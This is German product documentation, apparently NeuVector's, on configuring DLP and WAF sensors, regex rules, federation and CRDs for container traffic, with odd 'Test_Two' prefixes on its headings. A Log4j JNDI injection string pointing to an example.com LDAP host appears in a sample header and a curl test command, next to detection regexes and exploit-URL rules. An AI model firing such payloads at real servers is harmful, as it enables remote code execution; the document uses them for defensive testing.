= Test_TwoDLP & WAF-Sensoren
:revdate: 2025-05-05
:page-revdate: {revdate}
:page-opendocs-origin: /05.policy/09.dlp/09.dlp.md
:page-opendocs-slug:  /policy/dlp

== Test_TwoDatenverlustprävention (DLP) und Webanwendungsfirewall (WAF)

DLP und WAF nutzen die Deep Packet Inspection (DPI) von \{product-name}, um die Netzwerkpayloads von Verbindungen auf Verstöße gegen sensible Daten zu überprüfen. \{product-name} verwendet eine auf regulären Ausdrücken (Regex) basierende Engine, um Paketfilterfunktionen durchzuführen. Es sollte extreme Vorsicht walten, wenn Sensoren auf Containerverkehr angewendet werden, da die Filterfunktion zusätzlichen Systemaufwand verursacht und die Leistung des Hosts beeinträchtigen kann.

DLP- und WAF-Filterung werden unterschiedlich angewendet, abhängig von der Gruppe(n), auf die sie angewendet werden. Im Allgemeinen wird die WAF-Filterung auf eingehende und ausgehende Verbindungen angewendet, mit Ausnahme des internen Verkehrs, bei dem nur die eingehende Filterung angewendet wird. Die DLP-Filterung gilt für eingehende und ausgehende Verbindungen aus einer 'Sicherheitsdomäne', jedoch nicht für interne Verbindungen innerhalb einer Sicherheitsdomäne. Siehe die detaillierten Beschreibungen unten.

Die Konfiguration von DLP oder WAF ist ein zweistufiger Prozess:

. Definieren und testen Sie den/die Sensor(en), die die Menge der regulären Ausdrücke sind, die verwendet werden, um den Header, die URL oder das gesamte Paket zuzuordnen.
. Wenden Sie den gewünschten Sensor auf eine Gruppe im Bildschirm Richtlinie -> Gruppen an.

=== Test_TwoWAF Sensors

WAF-Sensoren repräsentieren die Inspektion des Netzwerkverkehrs zu/von einem Pod/Container. Diese Sensoren können auf jede anwendbare Gruppe angewendet werden, sogar auf benutzerdefinierte Gruppen (z. B. Namespace-Gruppen). Der eingehende Verkehr zu ALLEN Containern innerhalb der Gruppe wird auf die Erkennung von WAF-Regeln überprüft. Darüber hinaus werden alle ausgehenden (Egress-)Verbindungen außerhalb des Clusters überprüft.

Das bedeutet, dass, obwohl diese Funktion WAF genannt wird, sie nützlich und anwendbar für jeden Netzwerkverkehr ist, nicht nur für den Verkehr von Webanwendungen, und daher einen breiteren Schutz bietet als einfache WAFs. Zum Beispiel kann die API-Sicherheit bei ausgehenden Verbindungen zu einem externen API-Dienst durchgesetzt werden, wobei nur GET-Anfragen erlaubt und POSTs blockiert werden.

Beachten Sie auch, dass die Inspektion, obwohl sie DLP ähnlich ist, für den eingehenden Datenverkehr zu JEDER Pod/Container innerhalb der Gruppe erfolgt, während DLP die Inspektion nur auf den ein- und ausgehenden Datenverkehr der Gruppe anwendet (d.h. die Sicherheitsgrenze), nicht auf den internen Datenverkehr in der Gruppe (z.B. nicht ost-west innerhalb der Container einer Gruppe).

image:waf_sensors.png[waf]

=== Test_ZweiDLP-Sensoren

DLP-Sensoren sind die Muster, die zur Inspektion des Datenverkehrs verwendet werden. Integrierte Sensoren wie Kreditkarten und US-Sozialversicherungsnummern haben vordefinierte reguläre Ausdrücke. Sie können benutzerdefinierte Sensoren hinzufügen, indem Sie Regex-Muster definieren, die in diesem Sensor verwendet werden sollen. Beachten Sie, dass DLP, obwohl es WAF ähnlich ist, die Inspektion nur auf den ein- und ausgehenden Datenverkehr der Gruppe anwendet (d.h. die Sicherheitsgrenze), nicht auf den internen Datenverkehr in der Gruppe (z.B. nicht ost-west innerhalb der Container einer Gruppe). Die WAF-Inspektion ist nur für den eingehenden Datenverkehr zu JEDER Pod/Container innerhalb der Gruppe.

image:sensors.png[dlp]

=== Test_ZweiKonfigurieren von DLP- und WAF-Sensoren

Die Konfiguration von DLP- und WAF-Sensoren ist ähnlich. Erstellen Sie einen Sensornamen und einen Kommentar, wählen Sie dann den Sensor aus, um die Regeln für diesen Sensor hinzuzufügen oder zu bearbeiten. Wichtige Felder sind:

* Haben/Nicht Haben. Bestimmt, ob die Übereinstimmung erfordert, dass das Muster gefunden wird (Haben), um die Aktion (z.B. Verweigern) auszuführen, oder nur, wenn das Muster nicht existiert (Nicht Haben), sollte die Aktion ausgeführt werden. Es wird empfohlen, dass der "Nicht Haben"-Operator in der Regel mit einem Muster unter Verwendung des "Haben"-Operators kombiniert wird, da ein einzelnes Muster mit dem "Nicht Haben"-Operator nicht effektiv sein wird.
* Muster. Dies ist der reguläre Ausdruck, der verwendet wird, um eine Übereinstimmung zu bestimmen. Sie können Ihr Regex an Beispieldaten testen, um korrekte Haben/Nicht Haben-Ergebnisse sicherzustellen.
* Kontext. Wo man nach dem Muster suchen sollte. Wählen Sie das Paket für die umfassendste Inspektion der gesamten Netzwerkverbindung oder schränken Sie die Inspektion nur auf die URL, den Header oder den Body ein.

image:5_sensor_config.png[waf]

Jede DLP/WAF-Regel unterstützt mehrere Muster (maximal 16 Muster sind pro Regel erlaubt). Mehrere Muster sowie die Festlegung des Regelkontexts können ebenfalls helfen, falsch-positive Ergebnisse zu reduzieren.

Beispiel einer DLP-Regel mit einem Haben/Nicht Haben-Muster:
Haben:

[,shell]
----
\b3[47]\d{2}([ -]?)(?!(\d)\2{5}|123456|234567|345678)\d{6}\1(?!(\d)\3{4}|12345|56789)\d{5}\b
----

Dies führt zu einem falsch-positiven Treffer für "istio_agent_go_gc_duration_seconds_sum 22.378386247999998":

[,shell]
----
docker exec -ti httpclient sh
/ # curl -d "{\"context\": \"istio_agent_go_gc_duration_seconds_sum 22.378386247999998\"}" 172.17.0.5:8080/
Hello, world!
----

Das Hinzufügen eines Nicht-Haben-Musters entfernt das falsch-positive Ergebnis:

[,shell]
----
istio\_(\w){5}
----

*_Sensoren müssen auf eine Gruppe angewendet werden, um wirksam zu werden._*

=== Test_ZweiKonfigurieren von föderierten DLP- und WAF-Sensoren

Dies ist der allgemeine Prozess zur Konfiguration eines föderierten DLP- oder WAF-Sensors:

. Definieren und testen Sie die föderierten DLP/WAF-Sensor(en), die die Menge der regulären Ausdrücke sind, die verwendet werden, um den Header, die URL oder das gesamte Paket im **Primären Cluster -> Föderierte Richtlinie -> DLP-Sensoren oder WAF-Sensoren** Tab zuzuordnen.
. Wenden Sie den gewünschten Sensor auf eine benutzerdefinierte föderierte Gruppe im **Föderierte Richtlinie -> Gruppen** Tab an.
. Überprüfen Sie, ob die föderierten DLP/WAF-Sensor(en) mit dem verwalteten Cluster synchronisiert sind und wie erwartet funktionieren.

==== Test_TwoExample

Definieren Sie einen föderierten DLP/WAF-Sensor(en) in einem primären Cluster und wenden Sie ihn dann auf eine benutzerdefinierte föderierte Gruppe an, und überprüfen Sie dann, ob diese Sensoren auf alle verwalteten Cluster angewendet werden.

Schritte:

. Definieren Sie die föderierten DLP/WAF-Sensor(en) im primären Cluster im relevanten **DLP-Sensoren** oder **WAF-Sensoren** Tab:
+
image:federated_1.png[Föderierte WAF]
+
image:federated_2.png[Föderierte DLP]

. Wenden Sie die föderierten DLP/WAF-Sensor(en) auf eine benutzerdefinierte föderierte Gruppe im **Föderierte Richtlinie -> Gruppen** Tab an:
+
image:federated_3.png[Benutzerdefinierte föderierte Gruppe]

. Überprüfen Sie, ob die föderierten DLP/WAF-Sensor(en) mit den verwalteten Clustern synchronisiert sind:
+
image:federated_4.png[Föderierte WAF]
+
image:federated_5.png[Föderierte DLP]

. In den verwalteten Clustern senden Container Datenverkehr, der dem Muster der föderierten DLP/WAF-Sensor(en) entspricht:
+
image:federated_6.png[Föderierter Containerverkehr]

. Nach Schritt 4 werden DLP/WAF "Sicherheitsereignisse"-Benachrichtigungen generiert:
+
image:federated_7.png[DLP/WAF Sicherheitsbenachrichtigungs-Generierung]

=== Test_ZweiAnwendung von DLP/WAF-Sensoren auf Containergruppen

Um einen DLP- oder WAF-Sensor zu aktivieren, gehen Sie zu Richtlinie -> Gruppen, um die gewünschte Gruppe auszuwählen. Aktivieren Sie DLP/WAF für die Gruppe und fügen Sie die Sensor(en) hinzu.

Es wird empfohlen, DLP-Sensoren an der Grenze einer Sicherheitszone anzuwenden, die durch eine Gruppe definiert ist, um die Auswirkungen der DLP-Überprüfung zu minimieren. Falls erforderlich, definieren Sie eine benutzerdefinierte Gruppe, die eine solche Sicherheitszone darstellt.  Wenn die ausgewählte Gruppe beispielsweise die reservierte Gruppe 'Container' ist und DLP-Sensoren zur Gruppe hinzugefügt werden, wird nur der Datenverkehr in oder aus dem Cluster und nicht zwischen allen Containern überprüft. Oder wenn es sich um eine benutzerdefinierte Gruppe handelt, die als 'namespace=demo' definiert ist, wird nur der Datenverkehr in oder aus dem Namespace Demo überprüft, und nicht der gesamte inter-container Verkehr innerhalb des Namespace.

Es wird empfohlen, WAF-Sensoren nur auf Gruppen anzuwenden, bei denen eingehende (z. B. Ingress) Verbindungen erwartet werden, es sei denn, die Sensor(en) gelten für spezifische interne Anwendungen (die mit Ost-West-Verkehr rechnen).

image:apply_dlp_group.png[Gruppe]

==== Test_ZweiDLP/WAF Verhaltenszusammenfassung

* DLP-Musterabgleich erfolgt nicht für den Datenverkehr, der zwischen Arbeitslasten, die zur gleichen DLP-Gruppe gehören, verläuft.
* Jeder Datenverkehr, der in eine DLP-Gruppe hinein und heraus fließt, wird auf Musterübereinstimmungen gescannt.
* Cluster-Ingress- und Egress-Datenverkehr wird auf Muster gescannt, wenn die Arbeitslast berechtigt ist, Ingress/Egress-Verbindungen herzustellen.
* Mehrere Muster pro DLP/WAF-Regel (maximal 16 Muster sind pro Regel erlaubt).
* Für ein einzelnes Paket werden mehrere Warnungen generiert, wenn es mehreren Regeln entspricht.
* Aus Leistungsgründen werden nur die ersten 16 Regeln gewarnt und abgeglichen, auch wenn das Paket mehr als 16 Regeln entspricht.
* Warnungen werden aggregiert und zusammen gemeldet, wenn dieselbe Regel übereinstimmt und innerhalb von 2 Sekunden mehrere Male warnt.
* PCRE wird für die Mustererkennung verwendet.
* Die Hyper-Scan-Bibliothek wird für effiziente, skalierbare und leistungsstarke Mustererkennung verwendet.

=== Test_TwoDLP/WAF-Aktionen in Entdecken-, Überwachen- und Schützen-Modi

Beim Hinzufügen von Sensoren zu Gruppen kann die DLP/WAF-Aktion auf Warnung oder Verweigerung gesetzt werden, mit folgendem Verhalten, wenn es eine Übereinstimmung gibt:

* Entdeckungsmodus. Die Aktion wird immer eine Warnung sein, unabhängig von der Einstellung Warnung/Verweigerung.
* Überwachungsmodus. Die Aktion wird immer eine Warnung sein, unabhängig von der Einstellung Warnung/Verweigerung.
* Schutzmodus. Die Aktion wird eine Warnung sein, wenn auf Warnung gesetzt, oder blockieren, wenn auf Verweigerung gesetzt.

=== Test_TwoLog4j-Erkennung WAF-Muster

Die WAF-ähnliche Regel zur Erkennung des Log4j-Versuchsangriffs ist unten aufgeführt. Bitte beachten Sie, dass dies nur auf Gruppen angewendet werden sollte, die eingehende Webverbindungen erwarten.

[,shell]
----
\$\{((\$|\{|\s|lower|upper|\:|\-|\})*[jJ](\$|\{|\s|lower|upper|\:|\-|\})*[nN](\$|\{|\s|lower|upper|\:|\-|\})*[dD](\$|\{|\s|lower|upper|\:|\-|\})*[iI])((\$|\{|\s|lower|upper|\:|\-|\})|[ldapLDAPrmiRMIdnsDNShttpHTTP])*\:\/\/.*
----

Bitte beachten Sie auch, dass es Möglichkeiten gibt, wie Angreifer die Erkennung durch solche Regeln umgehen könnten.

=== Test_TwoTesten der Log4j WAF-Erkennung

Bei einem versuchten Angriff wird der Angreifer eine anfängliche jndi: Einfügung konstruieren und sie im User-Agent-HTTP-Header einfügen:

[,shell]
----
User-Agent: ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}
----

Die Verwendung von curl zum POSTen von Daten an den Server (Container) kann helfen, die WAF-Regel zu testen:

[,shell]
----
curl -X POST -k  -H "X-Auth-Token: $_TOKEN_" -H "Content-Type: application/json" -H "User-Agent: ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}" -d '$SOME_DATA' "http://$SOME_IP_:$PORT"
----

=== Test_TwoWAF-Einrichtung und -Test

Die herunterladbare Datei unten enthält ein nicht unterstütztes Skript zum Erstellen von WAF-Sensoren über CRD und zum Ausführen gängiger WAF-Regeltests gegen diese Sensoren. Die README enthält Anweisungen zum Ausführen.

xref:attachment$waf_test.zip[WAF-Testskript herunterladen]

=== Test_TwoSample Alerts

==== Test_TwoDLP Übereinstimmung im Entdecken- oder Überwachungsmodus

image:dlp4_alert_discover.png[DLPAlert]

==== Test_TwoDLP Übereinstimmung im Schutzmodus

image:dlp_5_protect.png[DLPProtect]

==== Test_TwoDLP Sicherheitsereignisbenachrichtigung für Kreditkartenübereinstimmung

image:dlp6_credit.png[DLPCredit]

[NOTE]
====
Die automatisierte Paketaufzeichnung enthält das tatsächliche Paket einschließlich der übereinstimmenden Kreditkartennummer. Das gilt auch für jede DLP-Paketaufzeichnung für sensible Daten.
====

== Test_TwoVerwalten von WAF-Regeln mit Import/Export oder CRDs

Es ist möglich, WAF-Regeln vom WAF-Bildschirm zu importieren oder zu exportieren. Dies kann nützlich sein, um Regeln auf andere Cluster zu übertragen, ein Backup zu erstellen oder sie zur Anwendung als CRD vorzubereiten.

Um WAF-Sensoren zu erstellen oder einen WAF-Sensor einer Gruppe mithilfe von CRDs zuzuweisen, stellen Sie sicher, dass die entsprechende NVWafSecurityRule-Clusterrollenbindung erstellt wird.

Beispiel WAF-Sensor CRD

.Klicken Sie hier für Details
[%collapsible]
====
[,yaml]
----
apiVersion: v1
items:
- apiVersion: neuvector.com/v1
  kind: NvWafSecurityRule
  metadata:
    name: sensor.execution
  spec:
    sensor:
      comment: arbitrary command execution attempt
      name: sensor.execution
      rules:
      - name: Alchemy
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/NUL\/.*\.\.\/\.\.\/
      - name: Log4j
        patterns:
        - context: header
          key: pattern
          op: regex
          value: \$\{((\$|\{|\s|lower|upper|\:|\-|\})*[jJ](\$|\{|\s|lower|upper|\:|\-|\})*[nN](\$|\{|\s|lower|upper|\:|\-|\})*[dD](\$|\{|\s|lower|upper|\:|\-|\})*[iI])((\$|\{|\s|lower|upper|\:|\-|\})|[ldapLDAPrmiRMIdnsDNShttpHTTP])*\:\/\/.*
      - name: formmail
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/formmail
        - context: packet
          key: pattern
          op: regex
          value: \x0a
      - name: CCBill
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/whereami\.cgi?.*g=
      - name: DotNetNuke
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/Install\/InstallWizard.aspx.*executeinstall
      - name: HNAP
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/tmUnblock.cgi
        - context: header
          key: pattern
          op: regex
          value: 'Authorization: Basic\s*YWRtaW46'
      - name: Magento
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/Adminhtml_.*forwarded=
      - name: b2
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/b2\/b2-include\/.*b2inc.*http\x3a\/\/
      - name: bat
        patterns:
        - context: url
          key: pattern
          op: regex
          value: x2ebat\x22.*?\x26
      - name: eshop.pl
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/eshop\.pl?.*seite=\x3b
      - name: whois_raw.cgi
        patterns:
        - context: url
          key: pattern
          op: regex
          value: \/whois_raw\.cgi?
        - context: packet
          key: pattern
          op: regex
          value: \x0a
kind: List
metadata: null
----
====

Beispiel CRD zur Zuweisung eines WAF-Sensors zu einer Gruppe

.Klicken Sie hier für Details
[%collapsible]
====
[,yaml]
----
apiVersion: v1
items:
- apiVersion: neuvector.com/v1
  kind: NvSecurityRule
  metadata:
    name: demo-group
    namespace: demo
  spec:
    egress: []
    file: []
    ingress: []
    process: []
    process_profile:
      baseline: default
    target:
      policymode: N/A
      selector:
        comment: ""
        criteria:
        - key: domain
          op: =
          value: demo
        - key: service
          op: =
          value: nginx-pod.demo
        - key: service
          op: =
          value: node-pod.demo
        name: demo-group
        original_name: ""
    waf:
      settings:
      - action: deny
        name: sensor.cross
      - action: deny
        name: sensor.execution
      - action: deny
        name: sensor.injection
      - action: deny
        name: sensor.traversal
      - action: deny
        name: wafsensor-1
      status: true
kind: List
metadata: null
----
====

Siehe den xref:usingcrd.adoc[CRD-Bereich] für weitere Details zur Arbeit mit CRDs.

== Test_TwoDLP/WAF-Antwortregeln

Antwortregeln, die auf DLP/WAF-Sicherheitsereignissen basieren, können in der Richtlinie ->Antwortregeln erstellt werden. Geben Sie DLP oder WAF ein, und das Dropdown-Menü listet alle Sensoren und Muster auf, die zur Erstellung von Regeln verfügbar sind.

image:dlp7_response.png[DLPResponse]
